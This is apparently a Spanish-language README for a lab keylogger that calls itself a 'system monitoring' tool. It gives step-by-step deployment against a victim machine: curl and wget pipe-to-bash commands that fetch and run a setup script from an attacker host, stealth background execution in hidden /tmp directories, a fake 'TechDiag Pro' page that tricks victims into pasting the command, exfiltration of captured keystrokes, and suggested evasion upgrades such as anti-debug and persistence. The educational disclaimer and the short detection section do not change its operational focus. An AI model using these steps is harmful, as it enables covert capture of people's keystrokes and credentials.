# Sistema de Monitoreo Empresarial - Laboratorio de Seguridad

## 📋 Descripción
Sistema de monitoreo y diagnóstico de rendimiento empresarial para laboratorios de seguridad. Captura eventos del sistema, los procesa y envía reportes cifrados a un servidor central.



## 📁 Estructura del Proyecto

### Máquina Víctima (Proyecto Principal)
```
project-davidochoa-Seguridad/
├── system_monitor.py       # Keylogger ofuscado principal
├── auto_setup.sh          # Script de instalación automática  
├── stop_monitor.sh         # Script para detener monitoreo
├── data_receiver.py        # Servidor receptor (solo para pruebas locales)
├── requirements.txt        # Dependencias Python
└── README.md              # Esta documentación
```

### Máquina Atacante (Separada)
```
attacker-machine/
├── data_receiver.py        # Servidor receptor principal
├── received_data/          # Directorio de datos descifrados
└── requirements.txt        # Dependencias del receptor
```

## ⚙️ Configuración de Red

### Puertos Utilizados
- **Puerto 8080**: Receptor de datos del keylogger (data_receiver.py)
- **Puerto 8000**: Servidor HTTP para descargar archivos
- **IPs del laboratorio**:
  - Máquina atacante: `10.0.2.15`
  - Máquina víctima: `10.0.2.4`

> ⚠️ **Importante**: Los dos servicios usan puertos diferentes para evitar conflictos.

## 🚀 Despliegue Completo

### 1. Preparar Máquina Atacante

```bash
# En tu máquina atacante
mkdir attacker-machine && cd attacker-machine

# Copiar solo el receptor
cp /path/to/project/data_receiver.py .
echo "requests" > requirements.txt

# Instalar dependencias
pip3 install -r requirements.txt

# Iniciar servidor receptor (puerto 8080)
python3 data_receiver.py --port 8080 --output received_data
```

### 2. Servir Archivos con Interfaz Web

```bash
# En el directorio del proyecto (puerto 8000)
python3 -m http.server 8000

# La interfaz web estará disponible en:
# http://TU_IP:8000
# 
# Características de la interfaz:
# ✅ Diseño profesional "TechDiag Pro"
# ✅ Dos opciones: Diagnóstico Completo/Rápido
# ✅ Instrucciones automáticas para la víctima
# ✅ Copia automática de comandos al portapapeles
```

### 3. Ejecutar en Máquina Víctima

#### 🌐 Opción A: Interfaz Web (Más Profesional)
```bash
# 1. Abrir navegador en máquina víctima
# 2. Ir a: http://10.0.2.15:8000
# 3. Ver interfaz "TechDiag Pro - Sistema de Diagnóstico Empresarial"
# 4. Hacer clic en "Iniciar Diagnóstico Completo"
# 5. Copiar comando mostrado y pegarlo en terminal
# 6. El keylogger se ejecutará automáticamente
```

#### 💻 Opción B: Instalación Automática (Backup)
```bash
# Desde la máquina víctima
curl -s http://10.0.2.15:8000/auto_setup.sh | bash

# O con wget
wget -q -O - http://10.0.2.15:8000/auto_setup.sh | bash
```

#### 🔧 Opción C: Instalación Manual
```bash
# Descargar archivos
wget http://10.0.2.15:8000/system_monitor.py

# Instalar dependencias
pip3 install pynput requests

# Ejecutar en modo stealth
nohup python3 system_monitor.py --stealth > /dev/null 2>&1 &
```

#### Opción C: Descarga Completa del Proyecto
```bash
# Descargar todo el directorio
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://10.0.2.15:8000/

# Ejecutar instalación
chmod +x auto_setup.sh
./auto_setup.sh
```

### 4. Detener el Monitoreo

```bash
# Desde la máquina víctima
curl -s http://10.0.2.15:8000/stop_monitor.sh | bash

# O manualmente
kill $(cat /tmp/.sys_tools/.monitor_pid)

# O con limpieza completa
pkill -f "system_monitor.py"
rm -rf /tmp/.sys_tools/
```

## 🔧 Configuración

### Cambiar IP del Servidor Atacante
Editar en `system_monitor.py`:
```python
config = {
    'server_host': "TU_IP_AQUI",  # Cambiar por tu IP real
    'server_port': 8080,
    # ... resto de configuración
}
```

### Ajustar Intervalos
```python
config = {
    'analysis_interval': 3,    # Análisis cada 3 segundos
    'report_interval': 10,     # Envío cada 10 segundos
    # ...
}
```

## 📊 Monitoreo de Resultados

### En la Máquina Atacante
```bash
# Ver datos recibidos en tiempo real
tail -f received_data/*.txt

# Listar archivos recibidos
ls -la received_data/

# Ver estadísticas del servidor
# (El receptor muestra estadísticas en consola)
```

### Archivos Generados
- `received_data/performance_monitor_TIMESTAMP.txt` - Datos descifrados
- Cada archivo contiene el texto capturado con timestamp

## 🧪 Pruebas de Evasión

### Verificar Ejecución Stealth
```bash
# Verificar que no hay output visible
ps aux | grep system_monitor
# Debería aparecer sin TTY asociado

# Verificar archivos ocultos
ls -la /tmp/.sys_tools/
```

### Verificar Comunicación
```bash
# En la máquina atacante, monitorear conexiones
netstat -an | grep :8080

# Ver logs del servidor receptor
# (Aparecen en la consola del servidor)
```

## 🔍 Análisis de Seguridad

### Técnicas Aplicadas
1. **Ofuscación de nombres**: SystemPerformanceMonitor en lugar de Keylogger
2. **Strings codificados**: Configuraciones en base64
3. **Ejecución silenciosa**: Sin output ni ventanas visibles
4. **Directorios ocultos**: Instalación en `/tmp/.sys_tools/`
5. **Metadatos falsos**: Comentarios empresariales en el código

### Detección Potencial
- Monitoreo de red (conexiones HTTP a IPs externas)
- Análisis de procesos (Python ejecutándose en background)
- Monitoreo de archivos (creación en /tmp/)
- Análisis de comportamiento (captura de teclado)

### Mejoras Avanzadas (Opcionales)
- Comunicación HTTPS con certificados falsos
- Ofuscación de payload con herramientas como PyArmor
- Compilación a binario con PyInstaller + UPX
- Técnicas anti-VM y anti-debug
- Persistencia en el sistema

## ⚠️ Uso Ético y Legal

Este proyecto es **SOLO PARA FINES EDUCATIVOS** en laboratorios controlados:

- ✅ Laboratorios de seguridad con VMs propias
- ✅ Entornos de práctica autorizados
- ✅ Investigación académica con permiso
- ❌ Sistemas sin autorización explícita
- ❌ Redes corporativas o públicas
- ❌ Cualquier uso malicioso

## 📚 Referencias Educativas

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Python Security Best Practices](https://python.org/dev/security/)

---
**Versión**: 2.1.4 - Optimizada para laboratorios  
**Autor**: Sistema de Seguridad Educativo  
**Licencia**: Solo uso educativo y académico
